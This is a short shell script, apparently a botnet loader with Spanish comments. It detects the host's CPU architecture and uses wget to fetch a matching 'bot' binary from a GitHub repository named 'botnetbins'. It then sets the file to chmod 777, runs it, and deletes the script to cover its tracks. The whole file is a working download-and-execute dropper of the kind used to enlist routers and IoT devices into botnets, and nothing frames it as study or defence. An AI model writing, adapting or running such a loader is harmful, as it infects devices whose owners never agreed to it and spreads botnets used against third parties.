#!/bin/sh
# loader.sh - Detecta arquitectura y descarga el binario correcto
cd /tmp || cd /var || cd /run
rm -rf bot x86 arm mips

ARCH=$(uname -m)
REPO_URL="https://raw.githubusercontent.com/XDomi216/botnetbins/main/"

echo "Detecting architecture: $ARCH"

if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "x86" ]; then
    echo "Downloading x86..."
    wget $REPO_URL/x86 -O bot
elif [ "$ARCH" = "armv5l" ]; then
    echo "Downloading armv5l..."
    wget $REPO_URL/armv5l -O bot
elif [ "$ARCH" = "armv7l" ]; then
    echo "Downloading armv7l..."
    wget $REPO_URL/armv7l -O bot
elif [ "$ARCH" = "armv8l" ] || [ "$ARCH" = "aarch64" ]; then
    # Nota: armv8l suele ser compatible con armv7l o requiere compilación específica.
    # Intentamos armv7l primero, si falla, no hay binario específico para aarch64 en tu repo.
    echo "Attempting armv7l for armv8/aarch64..."
    wget $REPO_URL/armv7l -O bot
elif [ "$ARCH" = "mips" ]; then
    echo "Downloading mips..."
    wget $REPO_URL/mips -O bot
elif [ "$ARCH" = "mipsel" ]; then
    echo "Downloading mipsel..."
    wget $REPO_URL/mipsel -O bot
else
    echo "Unknown architecture ($ARCH). Trying fallbacks..."
    # Fallback: intentar descargar todos hasta que uno funcione (rudo pero efectivo)
    wget $REPO_URL/x86 -O bot || wget $REPO_URL/armv5l -O bot || wget $REPO_URL/mips -O bot
fi

chmod 777 bot
./bot
rm -rf loader.sh
